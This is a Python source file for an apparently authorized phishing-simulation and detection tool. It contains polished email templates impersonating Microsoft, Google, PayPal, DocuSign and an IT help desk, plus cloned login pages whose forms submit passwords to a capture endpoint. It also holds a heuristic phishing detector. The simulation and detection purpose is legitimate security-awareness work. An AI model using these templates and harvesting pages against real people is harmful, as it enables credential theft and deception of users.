#!/usr/bin/env python3
"""
PhishGuard — Phishing Simulation & Detection Platform
For authorized security awareness testing only.
"""

import os, sys, json, sqlite3, hashlib, smtplib, re, time, csv, io, ipaddress
import threading, logging, socket, urllib.parse
from datetime import datetime, timedelta
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import (Flask, render_template_string, request, jsonify,
                   redirect, send_file, make_response)

# ─── Config ──────────────────────────────────────────────────────────────────
DB_PATH      = "phishguard.db"
LOG_PATH     = "phishguard.log"
WEB_PORT     = 7000
BASE_URL     = f"http://localhost:{WEB_PORT}"   # change to your server IP/domain

# ─── Logging ─────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_PATH), logging.StreamHandler(sys.stdout)]
)
log = logging.getLogger(__name__)

# ─── Database ─────────────────────────────────────────────────────────────────
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.executescript("""
    CREATE TABLE IF NOT EXISTS campaigns (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        name        TEXT NOT NULL,
        template_id TEXT NOT NULL,
        subject     TEXT NOT NULL,
        sender_name TEXT DEFAULT 'IT Security',
        sender_email TEXT DEFAULT 'security@corp.internal',
        redirect_url TEXT DEFAULT 'https://google.com',
        status      TEXT DEFAULT 'draft',
        created_at  TEXT NOT NULL,
        launched_at TEXT,
        notes       TEXT
    );
    CREATE TABLE IF NOT EXISTS targets (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        campaign_id INTEGER NOT NULL,
        email       TEXT NOT NULL,
        first_name  TEXT DEFAULT '',
        last_name   TEXT DEFAULT '',
        department  TEXT DEFAULT '',
        track_token TEXT UNIQUE NOT NULL,
        status      TEXT DEFAULT 'pending',
        FOREIGN KEY(campaign_id) REFERENCES campaigns(id)
    );
    CREATE TABLE IF NOT EXISTS events (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        campaign_id INTEGER,
        target_id   INTEGER,
        event_type  TEXT NOT NULL,
        ip_address  TEXT,
        user_agent  TEXT,
        data        TEXT,
        timestamp   TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS analyzer_results (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        input_type  TEXT,
        input_data  TEXT,
        risk_score  INTEGER,
        risk_level  TEXT,
        indicators  TEXT,
        timestamp   TEXT NOT NULL
    );
    CREATE INDEX IF NOT EXISTS idx_events_campaign ON events(campaign_id);
    CREATE INDEX IF NOT EXISTS idx_events_type     ON events(event_type);
    CREATE INDEX IF NOT EXISTS idx_targets_token   ON targets(track_token);
    """)
    conn.commit()
    conn.close()
    log.info("Database initialized.")

# ─── Token Helpers ────────────────────────────────────────────────────────────
def make_token(seed=""):
    return hashlib.sha256(f"{seed}{time.time()}".encode()).hexdigest()[:16]

def log_event(campaign_id, target_id, event_type, ip="", ua="", data=""):
    conn = get_db()
    conn.execute(
        "INSERT INTO events(campaign_id,target_id,event_type,ip_address,user_agent,data,timestamp) VALUES(?,?,?,?,?,?,?)",
        (campaign_id, target_id, event_type, ip, ua, data, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

# ─── Email Templates ──────────────────────────────────────────────────────────
TEMPLATES = {
    "microsoft_mfa": {
        "name": "Microsoft MFA Alert",
        "category": "Corporate IT",
        "icon": "🪟",
        "subject": "Action Required: Verify Your Microsoft Account",
        "html": """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><style>
body{{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;margin:0;padding:20px}}
.wrap{{max-width:600px;margin:0 auto;background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.1)}}
.header{{background:#0078d4;padding:20px 32px;display:flex;align-items:center;gap:12px}}
.header img{{width:24px}}
.header-title{{color:#fff;font-size:16px;font-weight:600}}
.body{{padding:32px}}
.title{{font-size:22px;color:#201f1e;margin-bottom:8px}}
.sub{{font-size:14px;color:#605e5c;margin-bottom:24px;line-height:1.5}}
.alert-box{{background:#fff4ce;border-left:4px solid #f59e0b;padding:16px;border-radius:2px;margin-bottom:24px;font-size:14px;color:#323130}}
.btn{{display:inline-block;background:#0078d4;color:#fff;padding:12px 28px;border-radius:4px;text-decoration:none;font-weight:600;font-size:14px}}
.footer{{padding:20px 32px;border-top:1px solid #edebe9;font-size:12px;color:#a19f9d}}
</style></head>
<body><div class="wrap">
<div class="header">
  <div style="width:24px;height:24px;background:#fff;border-radius:3px;display:flex;align-items:center;justify-content:center">
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:2px;width:16px;height:16px">
      <div style="background:#f25022"></div><div style="background:#7fba00"></div>
      <div style="background:#00a4ef"></div><div style="background:#ffb900"></div>
    </div>
  </div>
  <div class="header-title">Microsoft Account</div>
</div>
<div class="body">
  <div class="title">Verify your identity</div>
  <p class="sub">Hello {first_name},<br><br>We detected a sign-in attempt to your Microsoft account from an unrecognized device. To protect your account, please verify your identity immediately.</p>
  <div class="alert-box">⚠ Sign-in attempt detected from IP: 185.220.101.47 (Russia) — {timestamp}</div>
  <p style="font-size:14px;color:#323130;margin-bottom:20px">If this was you, please verify to continue. If not, your account may be compromised.</p>
  <a href="{track_url}" class="btn">Verify My Identity</a>
  <p style="font-size:12px;color:#a19f9d;margin-top:20px">This link expires in 24 hours. If you did not request this, please contact IT support.</p>
</div>
<div class="footer">Microsoft Corporation · One Microsoft Way · Redmond, WA 98052<br>This is an automated security notification.</div>
</div></body></html>""",
        "landing_template": "microsoft"
    },
    "google_workspace": {
        "name": "Google Workspace Security",
        "category": "Corporate IT",
        "icon": "🎨",
        "subject": "Security alert: New sign-in to your Google account",
        "html": """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><style>
body{{font-family:Google Sans,Roboto,Arial,sans-serif;background:#f8f9fa;margin:0;padding:20px}}
.wrap{{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.12)}}
.header{{padding:24px 40px;border-bottom:1px solid #e8eaed;display:flex;align-items:center;gap:10px}}
.g-logo{{font-size:22px;font-weight:700;letter-spacing:-.5px}}
.g-logo span{{color:#4285F4}}
.g-logo span:nth-child(2){{color:#EA4335}}
.g-logo span:nth-child(3){{color:#FBBC05}}
.g-logo span:nth-child(4){{color:#4285F4}}
.g-logo span:nth-child(5){{color:#34A853}}
.g-logo span:nth-child(6){{color:#EA4335}}
.body{{padding:40px}}
.title{{font-size:20px;color:#202124;margin-bottom:16px;font-weight:400}}
.info-box{{background:#e8f0fe;border-radius:8px;padding:16px;margin-bottom:24px;font-size:13px;color:#1a73e8}}
.btn{{display:inline-block;background:#1a73e8;color:#fff;padding:10px 24px;border-radius:4px;text-decoration:none;font-weight:500;font-size:14px}}
.btn-outline{{display:inline-block;border:1px solid #dadce0;color:#3c4043;padding:10px 24px;border-radius:4px;text-decoration:none;font-weight:500;font-size:14px;margin-left:12px}}
.footer{{padding:16px 40px;border-top:1px solid #e8eaed;font-size:12px;color:#5f6368}}
</style></head>
<body><div class="wrap">
<div class="header">
  <div class="g-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
  <div style="font-size:14px;color:#5f6368;margin-left:4px">Workspace Security</div>
</div>
<div class="body">
  <div class="title">New sign-in to {email}</div>
  <p style="font-size:14px;color:#3c4043;line-height:1.6">Hi {first_name},<br><br>Your Google Account was recently signed in to from a new device. We are letting you know in case this was not you.</p>
  <div class="info-box">📍 Location: Moscow, Russia &nbsp;|&nbsp; 🖥 Windows 10, Chrome &nbsp;|&nbsp; 🕐 {timestamp}</div>
  <p style="font-size:14px;color:#3c4043;margin-bottom:24px">If this was you, you can ignore this message. If not, please secure your account immediately.</p>
  <a href="{track_url}" class="btn">Review Activity</a>
  <a href="#" class="btn-outline">Change Password</a>
</div>
<div class="footer">Google LLC · 1600 Amphitheatre Pkwy · Mountain View, CA 94043</div>
</div></body></html>""",
        "landing_template": "google"
    },
    "it_password_reset": {
        "name": "IT Help Desk — Password Reset",
        "category": "Internal IT",
        "icon": "🔐",
        "subject": "[IT Help Desk] Your password expires in 24 hours",
        "html": """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><style>
body{{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:20px}}
.wrap{{max-width:600px;margin:0 auto;background:#fff;border-radius:4px;overflow:hidden;border:1px solid #ddd}}
.header{{background:#1e3a5f;padding:18px 28px;display:flex;align-items:center;gap:10px}}
.header-title{{color:#fff;font-size:15px;font-weight:bold}}
.body{{padding:28px}}
.title{{font-size:18px;color:#1e3a5f;margin-bottom:12px;font-weight:bold}}
.warning{{background:#fef2f2;border:1px solid #fecaca;border-radius:4px;padding:14px;margin-bottom:20px;font-size:13px;color:#dc2626}}
.btn{{display:inline-block;background:#1e3a5f;color:#fff;padding:12px 28px;border-radius:4px;text-decoration:none;font-weight:bold;font-size:14px}}
.info-table{{width:100%;border-collapse:collapse;font-size:13px;margin-bottom:20px}}
.info-table td{{padding:8px 0;border-bottom:1px solid #f0f0f0;color:#444}}
.info-table td:first-child{{color:#888;width:120px}}
.footer{{background:#f5f5f5;padding:16px 28px;font-size:11px;color:#888;border-top:1px solid #ddd}}
</style></head>
<body><div class="wrap">
<div class="header">🛡 <div class="header-title">IT Help Desk — Security Notice</div></div>
<div class="body">
  <div class="title">Your account password is expiring</div>
  <div class="warning">⚠ Your password will expire in less than 24 hours. Failure to update your password will result in account lockout.</div>
  <p style="font-size:14px;color:#444;margin-bottom:16px">Hello {first_name},<br><br>As part of our quarterly security policy, your network password must be renewed every 90 days. Please reset your password before the deadline below.</p>
  <table class="info-table">
    <tr><td>Account</td><td>{email}</td></tr>
    <tr><td>Department</td><td>{department}</td></tr>
    <tr><td>Deadline</td><td style="color:#dc2626;font-weight:bold">{timestamp}</td></tr>
    <tr><td>Ticket #</td><td>INC-{token}</td></tr>
  </table>
  <a href="{track_url}" class="btn">Reset Password Now</a>
  <p style="font-size:12px;color:#888;margin-top:16px">If you have already reset your password, you can ignore this message. Contact help@corp.internal for assistance.</p>
</div>
<div class="footer">IT Help Desk · Corporate Security Policy v4.2 · This is an automated message, do not reply.</div>
</div></body></html>""",
        "landing_template": "corporate"
    },
    "paypal_invoice": {
        "name": "PayPal Invoice Alert",
        "category": "Financial",
        "icon": "💰",
        "subject": "You have a money request from PayPal",
        "html": """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><style>
body{{font-family:'Helvetica Neue',Arial,sans-serif;background:#f5f7fa;margin:0;padding:20px}}
.wrap{{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08)}}
.header{{background:#003087;padding:20px 32px}}
.pp-logo{{color:#fff;font-size:22px;font-weight:bold;letter-spacing:-1px}}
.pp-logo em{{font-style:normal;color:#009cde}}
.body{{padding:32px}}
.amount{{font-size:36px;font-weight:bold;color:#001435;text-align:center;margin:20px 0;padding:20px;background:#f5f7fa;border-radius:8px}}
.amount span{{font-size:18px;color:#687173}}
.btn{{display:block;background:#0070ba;color:#fff;padding:16px;border-radius:6px;text-decoration:none;font-weight:bold;font-size:16px;text-align:center;margin:24px 0}}
.row{{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f0f0f0;font-size:14px;color:#444}}
.footer{{background:#f5f7fa;padding:20px 32px;font-size:11px;color:#687173;text-align:center}}
</style></head>
<body><div class="wrap">
<div class="header"><div class="pp-logo">Pay<em>Pal</em></div></div>
<div class="body">
  <p style="font-size:15px;color:#001435;margin-bottom:4px">Hello {first_name},</p>
  <p style="font-size:14px;color:#687173">You have a payment request that requires your immediate attention.</p>
  <div class="amount"><span>USD</span> $847.00</div>
  <div class="row"><span>From</span><span style="font-weight:600">Amazon Digital Services</span></div>
  <div class="row"><span>Note</span><span>Subscription renewal — Premium Plan</span></div>
  <div class="row"><span>Due</span><span style="color:#d20000;font-weight:600">Today, {timestamp}</span></div>
  <p style="font-size:13px;color:#687173;margin-top:16px">This charge will be automatically deducted from your account unless you dispute it. Review and cancel within 24 hours to avoid the charge.</p>
  <a href="{track_url}" class="btn">Review &amp; Dispute Charge</a>
</div>
<div class="footer">PayPal Inc. · 2211 North First Street · San Jose, CA 95131<br>© 2024 PayPal. All rights reserved.</div>
</div></body></html>""",
        "landing_template": "paypal"
    },
    "docusign": {
        "name": "DocuSign Document Signing",
        "category": "Business",
        "icon": "📄",
        "subject": "Please DocuSign: Urgent contract requires your signature",
        "html": """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><style>
body{{font-family:'Source Sans Pro',Arial,sans-serif;background:#f0f0f0;margin:0;padding:20px}}
.wrap{{max-width:600px;margin:0 auto;background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 1px 6px rgba(0,0,0,.1)}}
.header{{background:#FFCC00;padding:16px 28px;display:flex;align-items:center;gap:10px}}
.ds-logo{{font-size:18px;font-weight:bold;color:#333}}
.body{{padding:32px}}
.doc-card{{border:2px solid #e5e5e5;border-radius:6px;padding:20px;margin:20px 0;display:flex;gap:16px;align-items:center}}
.doc-icon{{width:48px;height:60px;background:#e8f4ff;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:28px;flex-shrink:0}}
.btn{{display:block;background:#444;color:#FFCC00;padding:14px;border-radius:4px;text-decoration:none;font-weight:bold;font-size:15px;text-align:center;margin:24px 0}}
.footer{{background:#f9f9f9;padding:16px 28px;font-size:11px;color:#888;border-top:1px solid #eee}}
</style></head>
<body><div class="wrap">
<div class="header">📋 <div class="ds-logo">DocuSign</div></div>
<div class="body">
  <p style="font-size:15px;color:#333"><strong>{first_name}</strong>, you have a document awaiting your signature.</p>
  <div class="doc-card">
    <div class="doc-icon">📄</div>
    <div>
      <div style="font-weight:bold;color:#333;margin-bottom:4px">NDA_Agreement_2024_Final.pdf</div>
      <div style="font-size:13px;color:#888">Sent by: Legal Department · {timestamp}</div>
      <div style="font-size:13px;color:#e74c3c;margin-top:4px">⏰ Expires in 24 hours</div>
    </div>
  </div>
  <p style="font-size:13px;color:#666">Please review and sign the document. By clicking the button below, you agree to use electronic records and signatures.</p>
  <a href="{track_url}" class="btn">Review &amp; Sign Document</a>
</div>
<div class="footer">DocuSign Inc. · 221 Main Street Suite 1000 · San Francisco, CA 94105<br>Do Not Share This Email — Contains a Unique Signing Link</div>
</div></body></html>""",
        "landing_template": "generic"
    }
}

# ─── Landing Page Templates ───────────────────────────────────────────────────
LANDING_PAGES = {
    "microsoft": """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Microsoft</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',sans-serif;background:#f3f2f1;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.card{{background:#fff;width:440px;padding:44px;border-radius:2px;box-shadow:0 2px 6px rgba(0,0,0,.12)}}
.logo{{margin-bottom:20px}}
.logo-grid{{display:grid;grid-template-columns:1fr 1fr;gap:3px;width:24px;height:24px}}
.logo-grid div:nth-child(1){{background:#f25022}}
.logo-grid div:nth-child(2){{background:#7fba00}}
.logo-grid div:nth-child(3){{background:#00a4ef}}
.logo-grid div:nth-child(4){{background:#ffb900}}
h1{{font-size:24px;font-weight:600;color:#201f1e;margin-bottom:12px}}
.sub{{font-size:14px;color:#605e5c;margin-bottom:24px}}
input{{width:100%;padding:7px 8px;border:1px solid #8a8886;border-radius:2px;font-size:15px;margin-bottom:8px;outline:none;transition:border-color .1s}}
input:focus{{border-color:#0078d4;box-shadow:0 0 0 1px #0078d4}}
.btn{{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;font-size:15px;font-weight:600;cursor:pointer;border-radius:2px;margin-top:16px}}
.btn:hover{{background:#106ebe}}
.links{{margin-top:16px;font-size:13px;color:#605e5c}}
.links a{{color:#0078d4;text-decoration:none}}
.forgot{{text-align:right;font-size:13px;margin-bottom:4px}}.forgot a{{color:#0078d4;text-decoration:none}}
</style></head>
<body>
<div class="card">
  <div class="logo"><div class="logo-grid"><div></div><div></div><div></div><div></div></div></div>
  <h1>Sign in</h1>
  <div class="sub" id="email-display">{email}</div>
  <form method="POST" action="/lp/capture/{token}">
    <input type="hidden" name="email" value="{email}">
    <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
    <div class="forgot"><a href="#">Forgot password?</a></div>
    <button type="submit" class="btn">Sign in</button>
  </form>
  <div class="links">No account? <a href="#">Create one!</a></div>
</div>
</body></html>""",

    "google": """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.card{{width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}}
.g-logo{{font-size:24px;font-weight:400;letter-spacing:-.5px;margin-bottom:24px;text-align:center}}
.g-logo span:nth-child(1){{color:#4285F4}}.g-logo span:nth-child(2){{color:#EA4335}}
.g-logo span:nth-child(3){{color:#FBBC05}}.g-logo span:nth-child(4){{color:#4285F4}}
.g-logo span:nth-child(5){{color:#34A853}}.g-logo span:nth-child(6){{color:#EA4335}}
h1{{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}}
.sub{{font-size:16px;color:#202124;text-align:center;margin-bottom:24px}}
input{{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:8px;outline:none;transition:border-color .2s}}
input:focus{{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}}
.btn{{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;font-size:15px;font-weight:500;cursor:pointer;border-radius:4px;margin-top:20px}}
.btn:hover{{background:#1557b0}}
.links{{margin-top:16px;display:flex;justify-content:space-between;font-size:14px}}
.links a{{color:#1a73e8;text-decoration:none}}
</style></head>
<body>
<div class="card">
  <div class="g-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
  <h1>Welcome back</h1>
  <div class="sub">{email}</div>
  <form method="POST" action="/lp/capture/{token}">
    <input type="hidden" name="email" value="{email}">
    <input type="password" name="password" placeholder="Enter your password" required>
    <button type="submit" class="btn">Next</button>
  </form>
  <div class="links"><a href="#">Forgot password?</a><a href="#">Create account</a></div>
</div>
</body></html>""",

    "corporate": """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Corporate Password Reset Portal</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:Arial,sans-serif;background:#1e3a5f;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.card{{background:#fff;width:420px;border-radius:6px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.3)}}
.header{{background:#1e3a5f;padding:20px 28px;color:#fff;font-size:16px;font-weight:bold}}
.body{{padding:32px}}
.field{{margin-bottom:16px}}
label{{display:block;font-size:13px;color:#555;margin-bottom:6px;font-weight:bold}}
input{{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:4px;font-size:14px;outline:none}}
input:focus{{border-color:#1e3a5f}}
.btn{{width:100%;padding:12px;background:#1e3a5f;color:#fff;border:none;font-size:15px;font-weight:bold;cursor:pointer;border-radius:4px;margin-top:8px}}
.note{{font-size:12px;color:#888;margin-top:16px;text-align:center}}
</style></head>
<body>
<div class="card">
  <div class="header">🔐 IT Security — Password Reset Portal</div>
  <div class="body">
    <p style="font-size:14px;color:#444;margin-bottom:20px">Reset your network password below. Your new password must meet the complexity requirements.</p>
    <form method="POST" action="/lp/capture/{token}">
      <input type="hidden" name="email" value="{email}">
      <div class="field"><label>Network Username / Email</label><input type="text" name="username" value="{email}" readonly></div>
      <div class="field"><label>Current Password</label><input type="password" name="password" placeholder="Enter current password" required></div>
      <div class="field"><label>New Password</label><input type="password" name="new_password" placeholder="Enter new password"></div>
      <div class="field"><label>Confirm New Password</label><input type="password" name="confirm_password" placeholder="Confirm new password"></div>
      <button type="submit" class="btn">Reset Password</button>
    </form>
    <div class="note">Ticket Reference: INC-{token} · IT Help Desk: ext. 2400</div>
  </div>
</div>
</body></html>""",

    "paypal": """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>PayPal - Log In</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Helvetica Neue',Arial,sans-serif;background:#f5f7fa;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.card{{background:#fff;width:400px;border-radius:8px;overflow:hidden;box-shadow:0 2px 16px rgba(0,0,0,.1)}}
.header{{background:#003087;padding:20px;text-align:center}}
.pp-logo{{color:#fff;font-size:28px;font-weight:bold;letter-spacing:-1px}}
.pp-logo em{{font-style:normal;color:#009cde}}
.body{{padding:32px}}
h2{{font-size:20px;color:#001435;margin-bottom:20px;text-align:center}}
input{{width:100%;padding:12px 14px;border:1px solid #cbd5e0;border-radius:6px;font-size:15px;margin-bottom:12px;outline:none}}
input:focus{{border-color:#0070ba;box-shadow:0 0 0 2px rgba(0,112,186,.15)}}
.btn{{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;font-size:16px;font-weight:bold;cursor:pointer;border-radius:6px}}
.btn:hover{{background:#003087}}
.links{{text-align:center;margin-top:16px;font-size:14px}}
.links a{{color:#0070ba;text-decoration:none}}
</style></head>
<body>
<div class="card">
  <div class="header"><div class="pp-logo">Pay<em>Pal</em></div></div>
  <div class="body">
    <h2>Log in to your account</h2>
    <form method="POST" action="/lp/capture/{token}">
      <input type="hidden" name="email" value="{email}">
      <input type="email" name="email_input" value="{email}" placeholder="Email">
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="btn">Log In</button>
    </form>
    <div class="links"><a href="#">Forgot password?</a> &nbsp;|&nbsp; <a href="#">Sign Up</a></div>
  </div>
</div>
</body></html>""",

    "generic": """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Secure Document Portal</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.card{{background:#fff;width:420px;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:40px}}
.icon{{font-size:48px;text-align:center;margin-bottom:20px}}
h2{{font-size:22px;color:#1a1a2e;text-align:center;margin-bottom:8px}}
.sub{{text-align:center;font-size:14px;color:#666;margin-bottom:28px}}
input{{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:6px;font-size:14px;margin-bottom:12px;outline:none}}
input:focus{{border-color:#4a6cf7}}
.btn{{width:100%;padding:13px;background:#4a6cf7;color:#fff;border:none;font-size:15px;font-weight:bold;cursor:pointer;border-radius:6px}}
</style></head>
<body>
<div class="card">
  <div class="icon">🔐</div>
  <h2>Verify Your Identity</h2>
  <div class="sub">Please sign in to view your document</div>
  <form method="POST" action="/lp/capture/{token}">
    <input type="hidden" name="email" value="{email}">
    <input type="email" name="email_input" value="{email}">
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" class="btn">View Document</button>
  </form>
</div>
</body></html>"""
}

# ─── Phishing Detection Engine ─────────────────────────────────────────────────
PHISH_PATTERNS = {
    "urgent_keywords": (["urgent","immediately","expire","suspended","verify","confirm","click here",
                          "act now","limited time","account locked","unauthorized","suspicious",
                          "security alert","reset password","update payment"], 8),
    "typosquat_domains": (["paypa1","paypel","gooogle","micosoft","arnazon","faceb00k",
                            "linkedln","twiter","netflx","gmial","outlok"], 20),
    "url_shorteners":    (["bit.ly","tinyurl","goo.gl","t.co","ow.ly","short.link",
                            "rb.gy","cutt.ly","is.gd","buff.ly"], 15),
    "suspicious_tlds":   ([".xyz",".top",".click",".loan",".work",".gq",".ml",
                            ".tk",".cf",".ga",".pw",".cc",".info"], 12),
    "ip_as_domain":      (r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", 25),
    "subdomain_abuse":   (["paypal.","google.","microsoft.","amazon.","apple.",
                            "netflix.","facebook.","login.","secure.","account."], 10),
    "data_fields":       (["password","passwd","pwd","credit.card","card.number",
                            "ssn","social.security","bank.account","routing"], 18),
    "http_not_https":    ("^http://", 12),
    "long_url":          (100, 8),   # URL length > N chars
    "many_subdomains":   (4, 10),    # more than N dots
    "encoded_url":       (["%2F","%2E","@"], 15),
}

def analyze_url(url: str) -> dict:
    indicators = []
    score = 0

    if not url.startswith("http"):
        url = "http://" + url

    try:
        parsed = urllib.parse.urlparse(url)
        domain = parsed.netloc.lower()
        path   = parsed.path.lower()
        full   = url.lower()

        # IP-based host
        try:
            ipaddress.ip_address(domain.split(":")[0])
            indicators.append({"label": "IP address used as domain", "severity": "critical", "points": 25})
            score += 25
        except ValueError:
            pass

        # HTTP (not HTTPS)
        if parsed.scheme == "http":
            indicators.append({"label": "Not using HTTPS (insecure)", "severity": "high", "points": 12})
            score += 12

        # URL shortener
        for s in PHISH_PATTERNS["url_shorteners"][0]:
            if s in domain:
                indicators.append({"label": f"URL shortener detected ({s})", "severity": "high", "points": 15})
                score += 15
                break

        # Suspicious TLD
        for t in PHISH_PATTERNS["suspicious_tlds"][0]:
            if domain.endswith(t):
                indicators.append({"label": f"Suspicious TLD ({t})", "severity": "medium", "points": 12})
                score += 12
                break

        # Typosquatting
        for b in PHISH_PATTERNS["typosquat_domains"][0]:
            if b in domain:
                indicators.append({"label": f"Possible typosquatting ({b})", "severity": "critical", "points": 20})
                score += 20
                break

        # Subdomain abuse
        for brand in PHISH_PATTERNS["subdomain_abuse"][0]:
            if domain.startswith(brand) or ("."+brand.rstrip(".")) in domain:
                indicators.append({"label": f"Brand name abused in subdomain ({brand.strip('.')})", "severity": "critical", "points": 18})
                score += 18
                break

        # Too many subdomains
        dot_count = domain.count(".")
        if dot_count > 4:
            indicators.append({"label": f"Excessive subdomains ({dot_count} dots)", "severity": "medium", "points": 10})
            score += 10

        # Long URL
        if len(url) > 100:
            indicators.append({"label": f"Unusually long URL ({len(url)} chars)", "severity": "low", "points": 8})
            score += 8

        # URL encoding tricks
        for enc in PHISH_PATTERNS["encoded_url"][0]:
            if enc in url:
                indicators.append({"label": f"URL encoding/obfuscation detected ({enc})", "severity": "medium", "points": 15})
                score += 15
                break

        # Sensitive data fields in path/query
        for kw in PHISH_PATTERNS["data_fields"][0]:
            if kw in full:
                indicators.append({"label": f"Sensitive field in URL ({kw})", "severity": "high", "points": 18})
                score += 18
                break

    except Exception as e:
        indicators.append({"label": f"URL parse error: {str(e)}", "severity": "medium", "points": 5})
        score += 5

    score = min(score, 100)
    level = "Critical" if score>=80 else "High" if score>=55 else "Medium" if score>=30 else "Low"
    return {"score": score, "level": level, "indicators": indicators, "url": url}


def analyze_email(headers: str, body: str) -> dict:
    indicators = []
    score = 0
    text = (headers + " " + body).lower()

    # Urgent keywords
    found_urgent = [kw for kw in PHISH_PATTERNS["urgent_keywords"][0] if kw in text]
    if found_urgent:
        pts = min(len(found_urgent) * 5, 30)
        indicators.append({"label": f"Urgency/pressure language ({', '.join(found_urgent[:4])})", "severity": "high", "points": pts})
        score += pts

    # Extract URLs from body
    urls = re.findall(r'https?://[^\s\'"<>]+', body)
    if not urls:
        urls = re.findall(r'href=["\']([^"\']+)["\']', body)

    for url in urls[:5]:
        r = analyze_url(url)
        if r["score"] > 20:
            indicators.append({"label": f"Suspicious URL: {url[:60]}...", "severity": "high", "points": min(r["score"]//3, 20)})
            score += min(r["score"] // 3, 20)

    # Spoofed display name vs actual domain
    display_match = re.findall(r'From:.*?<(.+?)>', headers)
    reply_match   = re.findall(r'Reply-To:\s*(.+)', headers)
    if display_match and reply_match:
        from_dom  = display_match[0].split("@")[-1].strip().lower() if "@" in display_match[0] else ""
        reply_dom = reply_match[0].split("@")[-1].strip().lower()   if "@" in reply_match[0]  else ""
        if from_dom and reply_dom and from_dom != reply_dom:
            indicators.append({"label": f"Reply-To domain mismatch ({from_dom} vs {reply_dom})", "severity": "critical", "points": 25})
            score += 25

    # Missing/failed SPF in headers
    if "spf=fail" in text or "spf=softfail" in text:
        indicators.append({"label": "SPF authentication failed", "severity": "critical", "points": 20})
        score += 20
    elif "spf=pass" not in text and "received-spf" not in text:
        indicators.append({"label": "No SPF record found in headers", "severity": "medium", "points": 10})
        score += 10

    # DKIM
    if "dkim=fail" in text:
        indicators.append({"label": "DKIM signature verification failed", "severity": "critical", "points": 20})
        score += 20
    elif "dkim=pass" not in text:
        indicators.append({"label": "No DKIM signature found", "severity": "medium", "points": 8})
        score += 8

    # Attachment hints
    if any(x in text for x in [".exe",".zip",".js",".bat",".ps1",".vbs","attachment"]):
        indicators.append({"label": "Suspicious attachment referenced", "severity": "high", "points": 15})
        score += 15

    # HTML form in email body
    if "<form" in body.lower() and "password" in body.lower():
        indicators.append({"label": "HTML form requesting credentials in email", "severity": "critical", "points": 25})
        score += 25

    # Generic greeting
    if any(x in text for x in ["dear customer","dear user","dear account holder","valued customer"]):
        indicators.append({"label": "Generic impersonal greeting", "severity": "low", "points": 5})
        score += 5

    score = min(score, 100)
    level = "Critical" if score>=80 else "High" if score>=55 else "Medium" if score>=30 else "Low"
    return {"score": score, "level": level, "indicators": indicators}


# ─── Flask App ────────────────────────────────────────────────────────────────
app = Flask(__name__)
logging.getLogger("werkzeug").setLevel(logging.ERROR)

